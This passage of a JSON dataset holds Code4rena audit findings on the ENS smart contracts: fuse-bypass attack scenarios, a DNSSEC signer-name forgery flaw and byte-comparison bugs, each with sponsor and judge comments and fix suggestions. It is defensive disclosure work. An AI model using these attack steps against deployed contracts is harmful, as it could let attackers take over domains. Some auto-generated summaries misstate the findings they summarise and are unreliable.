      "title": "[M-08] Wrong Equals Logic",
      "impact": "MEDIUM",
      "content": "\n[BytesUtils.sol#L115-L127](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L115-L127)<br>\n\n`equals` with offset might return true when `equals` without offset returns false.\n\n### Proof of Concept\n\nThe problem is that `self.length` could be greater than `other.length + offset`, it should be `==`, or it should contain a length argument.\n\nHere you have an example of the failure:\n\n*   `equals(0x0102030000, 0, 0x010203)` => `return true`\n\n```json\ndecoded input\t{\n\t\"bytes self\": \"0x0102030000\",\n\t\"uint256 offset\": \"0\",\n\t\"bytes other\": \"0x010203\"\n}\ndecoded output\t{\n\t\"0\": \"bool: true\"\n}\n```\n\n### Recommended Mitigation Steps\n\n```diff\n    function equals(bytes memory self, uint offset, bytes memory other) internal pure returns (bool) {\n-       return self.length >= offset + other.length && equals(self, offset, other, 0, other.length);\n+       return self.length == offset + other.length && equals(self, offset, other, 0, other.length);\n    }\n```\n\n**[makoto (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/118)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the BytesUtils.sol code. The vulnerability is that the `equals` function with offset might return true when `equals` without offset returns false. This is due to the fact that `self.length` could be greater than `other.length + offset`, which should be `==`, or it should contain a length argument. An example of the failure is given, where `equals(0x0102030000, 0, 0x010203)` returns true. The recommended mitigation step is to change the `equals` function to check that `self.length` is equal to `offset + other.length` instead of greater than.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/118",
      "tags": [],
      "finders": [
        "alan724",
        "0x1f8b"
      ]
    },
    {
      "id": "5551",
      "title": "[M-07] If `PARENT_CANNOT_CONTROL` is set on subdomain, it can be unwrapped then wrapped by its owner and then parent can control it again before the expiry",
      "impact": "MEDIUM",
      "content": "\n[NameWrapper.sol#L955-L961](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L955-L961)<br>\n\nThere is a general incorrect logic of allowing to burn only `PARENT_CANNOT_CONTROL` fuse without burning `CANNOT_UNWRAP` fuse. If only `PARENT_CANNOT_CONTROL` fuse is burnt, then domain can be unwrapped by its owner and then wrapped again, which clears `PARENT_CANNOT_CONTROL` fuse, making it possible for parent to bypass the limitation of parent control before the expiry.\n\nBypassing parent control scenario:\n\n1.  Alice registers and wraps `test.eth` domain\n2.  Alice creates subdomain `bob.test.eth` and burns `PARENT_CANNOT_CONTROL` fuse with max expiry, transferring this domain to Bob\n3.  At this point Bob can verify that he is indeed domain owner of `bob.test.eth` in `NameWrapper`, `PARENT_CANNOT_CONTROL` fuse is burnt for this domain and fuse expiry is set to expiry of `test.eth` domain. So Bob thinks his domain is secure and can not be taken from him before the expiry.\n4.  Bob unwraps `bob.test.eth` domain.\n5.  Bob wraps `bob.test.eth` domain, which clears fuses and expiry\n6.  Alice changes `bob.test.eth` domain ownership to her breaking Bob's impression that his domain was secure until expiry.\n\n### Proof of Concept\n\nCopy this to test/wrapper and run:<br>\nyarn test test/wrapper/NameWrapperBypassPCC.js\n\n<https://gist.github.com/panprog/71dea0fd1875b4d7d5849f7da822ea8b>\n\n### Recommended Mitigation Steps\n\nBurning any fuse (including `PARENT_CANNOT_CONTROL`) must require `CANNOT_UNWRAP` fuse to be burned (because otherwise it's possible to unwrap+wrap to clear that fuse).\n\nIn `NameWrapper._canFusesBeBurned`, condition should be different:\n\n        if (\n            fuses & ~CANNOT_UNWRAP != 0 &&\n            fuses & (PARENT_CANNOT_CONTROL | CANNOT_UNWRAP) !=\n            (PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)\n        ) {\n            revert OperationProhibited(node);\n        }\n\n**[jefflau (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/119#issuecomment-1189822680):**\n > A mitigation step for this could be to not burn fuses when unwrapping domains to prevent the `PARENT_CANNOT_CONTROL` from being reset.\n\n**[Arachnid (ENS) disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/119#issuecomment-1196222115):**\n > Since this has to be self-inflicted by the victim, this should be severity 2.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/119#issuecomment-1203925662):**\n > Agree with the sponsor that this is a medium severity issue due to the external requirement that Bob unwraps and rewraps the domain. Additionally, this requires Alice to all of a sudden become a bad actor, making it highly unlikely that this would occur.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is related to a vulnerability in the NameWrapper.sol code, which is part of the 2022-07-ens project on Github. The vulnerability allows a domain owner to bypass the limitation of parent control before the expiry. This can be done by burning only the PARENT_CANNOT_CONTROL fuse without burning the CANNOT_UNWRAP fuse. To exploit this vulnerability, the domain owner needs to unwrap and wrap the domain, which clears both fuses and expiry. As a result, the parent can take control of the domain before the expiry. \n\nTo test this vulnerability, the user can copy the provided code to the test/wrapper directory and run it using the command â€˜yarn test test/wrapper/NameWrapperBypassPCC.jsâ€™.\n\nThe recommended mitigation step for this vulnerability is to ensure that burning any fuse (including PARENT_CANNOT_CONTROL) must require CANNOT_UNWRAP fuse to be burned. This can be done by changing the condition in the NameWrapper._canFusesBeBurned function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/119",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "5550",
      "title": "[M-06] `BytesUtils`: compare will not revert when the `offset` and `len` exceeds the bytes lengths",
      "impact": "MEDIUM",
      "content": "\n[BytesUtils.sol#L44-L51](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L44-L51)<br>\n\nCompare will return false answer without reverting when the inputs are not valid.\n\n### Proof of Concept\n\nThe `compare` function is used for `compareNames`. The names are supposed to be DNS wire format. If the strings are malformed, it is possible to give out-of-range `offset`, `len`, `otheroffset`, and `otherlen`. When it happens, the `compare` will return some false values, without reverting, since the validity of `offset` and `len` are not checked.\n\n```solidity\n// https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L44-L51\n// dnssec-oracle/BytesUtils.sol::compare\n// The length of self and other are not enforced\n\n 44     function compare(bytes memory self, uint offset, uint len, bytes memory other, uint otheroffset, uint otherlen) internal pure returns (int) {\n 45         uint shortest = len;\n 46         if (otherlen < len)\n 47         shortest = otherlen;\n 48\n 49         uint selfptr;\n 50         uint otherptr;\n```\n\n### Recommended Mitigation Steps\n\nCheck whether the `offset`, `len` are within the length of `self`, as well as for the `other`.\n\n**[makoto (ENS) acknowledged and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/180#issuecomment-1196600009):**\n > It's lacking enough test to prove the bug.\n\n**[Arachnid (ENS) confirmed and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/180#issuecomment-1198703171):**\n > `compareNames` does not sanity check the lengths passed in, so this is a legitimate bug.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `compare` function of the `BytesUtils.sol` contract. The function is used for `compareNames` and the names are supposed to be in DNS wire format. If the strings are malformed, it is possible to give out-of-range `offset`, `len`, `otheroffset`, and `otherlen`. When this happens, the `compare` will return some false values, without reverting, since the validity of `offset` and `len` are not checked. The impact of this vulnerability is considered to be MED, as it could impact the function of the protocol. The recommended mitigation steps to fix this vulnerability is to check whether the `offset`, `len` are within the length of `self`, as well as for the `other`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/180",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "5549",
      "title": "[M-05] `DNSSECImpl.verifySignature` compares strings incorrectly, allowing malicious zones to forge DNSSEC trust chain",
      "impact": "MEDIUM",
      "content": "\n[DNSSECImpl.sol#L186-L190](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L186-L190)<br>\n\nDNSSEC allows parent zones to sign for its child zones. To check validity of a signature, RFC4034 3.1.7 requires the `Signer's Name` in any RRSIG RDATA to contain the zone of covered RRset. This requirement is reasonable since any child zone should be covered by its parent zone.\n\nENS tries to implement the concept of name coverage in `DNSSECImpl.verifySignature`, but unfortuantely does it wrong, resulting in possibiliy of coverage between two unrelated domains. In the worst case, an attacker can utilize this bug to forge malicious trust chains and authenticate invalid domains.\n\n### Proof of Concept\n\nIn `DNSSECImpl.verifySignature`, ENS tries to verify the name of RRSet zone (`name`) is contained by Signer's Name (`rrset.signerName`).\n\n        if(rrset.signerName.length > name.length\n                || !rrset.signerName.equals(0, name, name.length - rrset.signerName.length))    //## This allows matches such as name=\"SubString.com\" signerName=\"String.com\", which is clearly incorrect, use label counts instead\n            {\n                revert InvalidSignerName(name, rrset.signerName);\n            }\n\nIn DNS, for a parent zone to contain another child zone, we generally require the child zone to be a subdomain of the parent. For instance, `example.eth.` in considered to cover `sub.example.eth.`, while `xample.eth.` should not be cover `example.eth.`.\n\nUnfortunately in the implementation shown above, both cases will path the check, and `ample.eth.` will be considered appropriate to sign for `example.eth.`. This is against the original design of DNS, and would result in breach of zone hierarchy.\n\nIn practice, the requirement to exploit this is a bit more complex. Since names are stored as a sequence of packed labels, `example.eth.` should be stored as `\\x06example\\x03eth\\x00`, while `xample.eth.` is stored as `\\x05xample\\x03eth\\x00`. Thus to successfully pull off the attack ,we have to make sure that the packed signer's name is actually a substring of child zone.\n\nA simple (yet unrealistic) example can be like this `xample.eth.` can sign for `e\\x05xample.eth.`, since packed format of those two names are `\\x05xample\\x03eth\\x00` and `\\x07e\\x05ample\\x03eth\\x00`.\n\nIn general, it would require some effort for an attacker to find attackable zones, nevertheless, this should still be considered as a potential threat to the integrity of ENS.\n\n### Recommended Mitigation Steps\n\nCheck label by label instead of comparing the entire name.<br>\nTo actually meet all requirements specified in RFC4034 and RFC4035, there are still a lot to do, but we will discuss that in a separate issue for clarity.\n\n**[Arachnid (ENS) disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/207#issuecomment-1196205728):**\n > This is a valid issue, but unexploitable in the wild; RFC 1035 specifies labels are limited to 63 octets or less, and the ASCII code of lowercase 'a' is 97. As a result, no vulnerable names should exist.\n> \n> Recommend that this be triaged as severity 2 as a result.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/207#issuecomment-1203857417):**\n > I agree with @Arachnid on this. The lack of real world likelihood makes this a Medium severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the DNSSECImpl.sol file of the Ethereum Name Service (ENS) code. This vulnerability can allow for the forging of malicious trust chains and authentication of invalid domains. The vulnerability exists because the code is checking if the Signer's Name is contained within the zone of the covered RRset, instead of checking label by label. This can lead to the authentication of unrelated domains if the packed signer's name is a substring of the child zone. The recommended mitigation steps are to check label by label instead of comparing the entire name, and further discussion of RFC4034 and RFC4035 requirements should be discussed in a separate issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/207",
      "tags": [],
      "finders": [
        "csanuragjain",
        "GimelSec"
      ]
    },
    {
      "id": "5548",
      "title": "[M-04] `BytesUtil.compare` returns wrong result on some strings longer than 32 characters",
      "impact": "MEDIUM",
      "content": "\n[BytesUtils.sol#L66-L70](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/BytesUtils.sol#L66-L70)<br>\n\nDue to incorrect condition in `ByteUtil.compare` function, irrelevant characters are masked out only for strings shorter than `32` characters. However, they must be masked out for strings of all lengths in the last pass of the loop (when remainder of the string is 32 characters or less). This leads to incorrect comparision of strings longer than `32` characters where `len` or `otherlen` is smaller than string length (characters beyond provided length are still accounted for in the comparision in this case while they should be ignored).\n\nThis wrong `compare` behaviour also makes `RRUtils.compareNames` fail to correctly compare DNS names in certain cases.\n\nWhile the `BytesUtil.compare` and `RRUtils.compareNames` methods are currently not used in the functions in the scope (but are used in mainnet's `DNSSECImpl.checkNsecName`, which is out of scope here), they're public library functions relied upon and can be used by the other users or the ENS project in the future. And since the functions in scope provide incorrect result, that's a wrong (unexpected) behaviour of the smart contract. Moreover, since the problem can be seen only with the large strings (more than `32` characters), this might go unnoticed with any code that uses `compare` or `compareNames` method and can potentially lead to high security risk of any integration project or ENS itself.\n\nExample strings to compare which give incorrect result:\n`01234567890123450123456789012345ab`\n`01234567890123450123456789012345aa`\n\nEach string is `34` characters long, first `33` characters are the same, the last one is different. If we compare first `33` characters of both strings, the result should be `equal` (as they only differ in the 34th character), but `compare` will return `>`, because it fails to ignore the last character of both strings and simply compares strings themselves.\n\nIf we compare the first `33` characters from the first string vs all `34` characters of the second string, the result of `compare` will be `>`, while the correct result is `<`, because `compare` fails to ignore the last character of the first string.\n\nExample dns names to compare which give incorrect result:<br>\n`01234567890123456789012345678901a0.0123456789012345678901234567890123456789012345678.eth`<br>\n`01234567890123456789012345678901a.0123456789012345678901234567890123456789012345678.eth`<br>\n\nThe first dns name should come after the second, but `dnsCompare` returns `-1` (the first name to come before), because the length of the 2nd domain (49 characters) is ASCII character `1` and is not correctly masked off during strings comparision.\n\n### Proof of Concept\n\ngit diff\n\n<https://gist.github.com/panprog/32adefdc853ccd0fd0f1aad85c526bea>\n\nthen:\n\nyarn test test/dnssec-oracle/TestSolidityTests.js\n\n### Recommended Mitigation Steps\n\nIn addition to the incorrect condition, the mask calculation formula: `32 - shortest + idx` will also overflow since `shortest` can be more than `32`, so addition should be performed before subtractions.\n\n                if (shortest - idx >= 32) {\n                    mask = type(uint256).max;\n                } else {\n                    mask = ~(2 ** (8 * (idx + 32 - shortest)) - 1);\n                }\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/78)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the smart contract BytesUtil.sol, which is part of the dnssec-oracle library. This bug can lead to incorrect comparison of strings longer than 32 characters, resulting in incorrect results when comparing two strings. This can also lead to incorrect comparison of DNS names, which can be a security risk if the incorrect comparison goes unnoticed.\n\nThe bug is due to an incorrect condition in the `ByteUtil.compare` function, which masks out irrelevant characters only for strings shorter than 32 characters. However, they should be masked out for strings of all lengths. Additionally, the mask calculation formula can overflow since `shortest` can be more than 32, so addition should be performed before subtractions.\n\nTo prove the bug, a git diff can be used, followed by running the command `yarn test test/dnssec-oracle/TestSolidityTests.js`.\n\nThe recommended mitigation step is to correct the condition in the `ByteUtil.compare` function and also the mask calculation formula.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/78",
      "tags": [],
      "finders": [
        "alan724  GimelSec",
        "panprog"
      ]
    },
    {
      "id": "5547",
      "title": "[M-03] `transfer()` depends on gas consts",
      "impact": "MEDIUM",
      "content": "\n[ETHRegistrarController.sol#L183-L185](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L183-L185)<br>\n[ETHRegistrarController.sol#L204](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/ETHRegistrarController.sol#L204)<br>\n\n`transfer()` forwards 2300 gas only, which may not be enough in future if the recipient is a contract and gas costs change. it could break existing contracts functionality.\n\n### Proof of Concept\n\n`.transfer` or `.send` method, only 2300 gas will be â€œforwardedâ€ to fallback function. Specifically, the SLOAD instruction, will go from costing 200 gas to 800 gas.\n\nIf any smart contract has a functionality of register ens and it has fallback function which is making some state change in contract on ether receive, it could use more than 2300 gas and revert every transaction.\n\nFor reference, check out:\n* <https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=transfer#sending-and-receiving-ether>\n* <https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>\n\n### Recommended Mitigation Steps\n\nUse `.call` insted `.transfer`\n\n     (bool success, ) = msg.sender.call.value(amount)(\"\");\n     require(success, \"Transfer failed.\");\n\n**[jefflau (ENS) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/133#issuecomment-1196371402):**\n > Recommend reducing severity to QA\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/133#issuecomment-1203817454):**\n > I'm downgrading this to Medium. There are external factors required to make this problem occur, but if it does the functionality of the protocol as a whole could be severely impacted.\n\n**[Arachnid (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/133#issuecomment-1206025827):**\n > It's unclear to me how this could be a significant issue. Anyone writing code to register names knows that any excess funds will be returned, and therefore that they need a fallback that consumes minimal gas. Any EVM change that increases the gas of fallback functions would be breaking for a great number of contracts beyond ENS.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/133#issuecomment-1208062192):**\n > > It's unclear to me how this could be a significant issue.\n> \n> The register functions will fail, consuming a good bit of gas along the way if this occurs. If this were not such a critical piece of functionality I would have considered it QA, but a failure here breaks the protocol.\n> \n> > Anyone writing code to register names knows that any excess funds will be returned, and therefore that they need a fallback that consumes minimal gas. Any EVM change that increases the gas of fallback functions would be breaking for a great number of contracts beyond ENS.\n> \n> The fact that other contracts will break along with ENS does not invalidate the issue. This is a clearly documented problem that has been known for years (see ref links). There is no reason to introduce more critical contracts to the ecosystem that will fail in this scenario, particularly when it is so easy to avoid.\n\n**[Arachnid (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/133#issuecomment-1214550653):**\n > > The register functions will fail, consuming a good bit of gas along the way if this occurs. If this were not such a critical piece of functionality I would have considered it QA, but a failure here breaks the protocol.\n> \n> I think the implied API here is that any contract registering names with the controller must either send the right amount of ether, or have a fallback function that can accept ether. Changes to the consensus layer that invalidate that assumption for a given contract are out-of-scope for ENS.\n> \n> Sending all remaining gas with the refund increases the threat surface by allowing possible reentrancy etc, which we haven't examined as a threat model here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report outlines a vulnerability in the code found in the ETHRegistrarController.sol file. The vulnerability lies in the transfer() method, which only forwards 2300 gas to the recipient. This may not be enough in the future if the recipient is a contract and the cost of gas changes, which could break existing contracts functionality.\n\nThe proof of concept is that when using the .transfer or .send method, only 2300 gas will be â€œforwardedâ€ to the fallback function. This could be problematic if a smart contract has a functionality of register ENS and a fallback function that makes state changes in the contract on ether receive. This could use more than 2300 gas and cause transactions to be reverted.\n\nThe tools used for manual analysis are referenced in the report. The recommended mitigation step is to use the .call method instead of the .transfer method. This method will allow the sender to check if the transfer was successful and revert it if not.",
      "quality_score": 1,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/133",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "scaraven",
        "Jujic",
        "fatherOfBlocks",
        "berndartmueller",
        "cryptphi",
        "0x29A",
        "_Adam",
        "Ch_301",
        "asutorufos",
        "pashov",
        "TomJ",
        "c3phas",
        "Amithuddar",
        "csanuragjain",
        "IllIllI",
        "cccz",
        "Ruhum",
        "zzzitron",
        "0xNineDec",
        "durianSausage",
        "hake",
        "__141345__",
        "Limbooo",
        "alan724",
        "Dravee",
        "hyh",
        "RedOneN",
        "Aussie_Battlers",
        "rajatbeladiya",
        "GimelSec"
      ]
    },
    {
      "id": "5546",
      "title": "[M-02] Renew of 2nd level domain is not done properly",
      "impact": "MEDIUM",
      "content": "\n[ETHRegistrarController.sol#L201](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/ethregistrar/ETHRegistrarController.sol#L201)<br>\n[NameWrapper.sol#L271](https://github.com/ensdomains/ens-contracts/blob/master/contracts/wrapper/NameWrapper.sol#L271)<br>\n\nThe ETHRegistrarController is calling renew from base registrar and not through Namewrapper. This means the fuses for the subdomain will not be updated via [\\_setData](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/wrapper/NameWrapper.sol#L284). This impacts the permission model set over subdomain and could lead to takeover\n\n### Proof of Concept\n\n1.  Observe the [renew](https://github.com/code-423n4/2022-07-ens/blob/main/contracts/ethregistrar/ETHRegistrarController.sol#L189) function\n\n<!---->\n\n    function renew(string calldata name, uint256 duration)\n            external\n            payable\n            override\n        {\n            ...\n\n            uint256 expires = base.renew(uint256(label), duration);\n\n            ....\n        }\n\n2.  As we can see this is calling renew function of Base Registrar instead of NameWrapper. Since this is not going via NameWrapper fuses will not be set\n\n3.  Also since renew in NameWrapper can only be called via Controller which is ETHRegistrarController so there is no way to renew subdomain\n\n### Recommended Mitigation Steps\n\nThe ETHRegistrarController must renew using Namewrapper's renew contract.\n\n**[Arachnid (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/63#issuecomment-1196218068):**\n > Duplicate of [#223](https://github.com/code-423n4/2022-07-ens-findings/issues/223).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/63#issuecomment-1203797392):**\n > On [#223](https://github.com/code-423n4/2022-07-ens-findings/issues/223), which I've invalidated, @Arachnid notes that:\n> > In fact, this should only be severity QA, as it can be worked around by calling `renew` on the registrar controller followed by `setChildFuses`.\n> \n> I'm going to make this report the main one and leave the risk rating of Medium in place. While there is a workaround, if the workaround is not employed, permissions will be incorrect and may lead to a breakdown in the functioning of the protocol. \n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the ETHRegistrarController, which is a part of a code repository found at the given link. The bug report states that the ETHRegistrarController is calling the renew function of the Base Registrar instead of the NameWrapper. This means that the fuses for the subdomain will not be updated via the _setData function, leading to a potential takeover. \n\nThe bug report provides a proof of concept to demonstrate the issue. The proof of concept firstly observes the renew function of the ETHRegistrarController, which calls the renew function of the Base Registrar. Secondly, it is noted that since the renew is not going via NameWrapper, the fuses will not be set. Lastly, it is noted that since the renew in NameWrapper can only be called via Controller, which is ETHRegistrarController, there is no way to renew subdomain. \n\nThe bug report recommends that the ETHRegistrarController must renew using Namewrapper's renew contract in order to mitigate the issue. This recommendation should be followed in order to ensure the security of the subdomain.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/63",
      "tags": [],
      "finders": [
        "csanuragjain",
        "cccz  GimelSec"
      ]
    },
    {
      "id": "5545",
      "title": "[M-01] `wrapETH2LD` permissioning is over-extended",
      "impact": "MEDIUM",
      "content": "\nUndesired use of ENS wrapper.\n\n### Proof of Concept\n\n[NameWrapper.sol#L219-L223](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L219-L223)<br>\n\nCurrent permissioning for wrapETH2LD allows msg.senders who are not owner to call it if they are EITHER approved for all on the ERC721 registrar or approved on the wrapper. Allowing users who are approved for the ERC721 registrar makes sense. By giving them approval, you are giving them approval to do what they wish with the token. Any other restrictions are moot regardless because they could use approval to transfer themselves the token anyways and bypass them as the new owner. The issue is allowing users who are approved for the wrapper contract to wrap the underlying domain. By giving approval to the contract the user should only be giving approval for the wrapped domains. As it is currently setup, once a user has given approval on the wrapper contract they have essentially given approval for every domain, wrapped or unwrapped, because any unwrapped domain can be wrapped and taken control of. This is an over-extension of approval which should be limited to the tokens managed by the wrapper contract and not extend to unwrapped domains\n\n### Recommended Mitigation Steps\n\nRemove L221.\n\n**[Arachnid (ENS) disagreed with severity and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/51#issuecomment-1196225256):**\n > This was by design, but the warden raises a good point about the implications of this permission model. Recommend downgrading to QA.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-07-ens-findings/issues/51#issuecomment-1203751996):**\n > I'm going to downgrade this to medium. There are not assets at direct risk, but with external factors the assets could be at risk due to the user being unaware that in approving wrapped domains, they are also approving unwrapped domains.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a wrapper contract, which allows undesired use of ENS (Ethereum Name Service) wrapper. The vulnerability lies in the permissioning for wrapETH2LD which allows msg.senders who are not owners to call it if they are approved for either all on the ERC721 registrar or approved on the wrapper. This means that any user who has been given approval on the wrapper contract can take control of any unwrapped domain by wrapping it. To mitigate this vulnerability, it is recommended to remove line 221 from the code.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/51",
      "tags": [
        "Validation",
        "Ownership"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "5544",
      "title": "[H-03] `PARENT_CANNOT_CONTROL` can be bypassed by maliciously unwrapping parent node",
      "impact": "HIGH",
      "content": "\n[NameWrapper.sol#L356](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356)<br>\n[NameWrapper.sol#L295](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295)<br>\n[ENSRegistry.sol#L74](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74)<br>\n\nBy design, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.\n\nHowever, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin.\n\nConsidering the following attack scenario:\n\n*   Someone owns a domain (or a 2LD), e.g., *poc.eth*\n*   The domain owner assigns a sub-domain to the hacker, e.g., *hack.poc.eth*\n    *   This sub-domain should not burn `CANNOT_UNWRAP`\n    *   This sub-domain can burn `PARENT_CANNOT_CONTROL`\n*   Hacker assigns a sub-sub-domain to a victim user, e.g., *victim.hack.poc.eth*\n*   The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`\n    *   The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally\n*   However, the hacker then unwraps his sub-domain, i.e., *hack.poc.eth*\n*   The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain\n    *   He can reassign himself as the owner of the *victim.hack.poc.eth*\n*   The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., *victim.hacker.poc.eth*\n\nThe root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming.\n\n### Suggested Fix\n\n*   Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped.\n*   Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.\n\n### Proof of Concept / Attack Scenario\n\nFor full details, please see [original warden submission](https://github.com/code-423n4/2022-07-ens-findings/issues/173).\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/173)**\n\n\n\n***\n\n \n",
      "summary": "\nA bug has been identified in the code of the NameWrapper contract of the 2022-07-ens project. The bug allows a parent node to maliciously unwrap itself and, by doing so, bypass the constraint that, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner. \n\nThis can be done by a hacker becoming the ENS owner of the parent node, and leveraging `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain. The hacker can then invoke `NameWrapper.wrap` to rewrite the fuses and wrapper owner of the given subdoamin. \n\nTo demonstrate this bug, two PoC files, `poc1.js` and `poc2.js`, have been provided. The `poc1.js` is for a case where the hacker holds a 2LD, and the `poc2.js` demonstrates the aforementioned scenario. To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.\n\nTwo potential fixes have been suggested for this bug. The first fix is to auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. The second fix is to leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping. \n\nDiscussed with the project member, Jeff Lau, if there is any issue running the attached PoC code, contact izhuer#0001 on discord.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
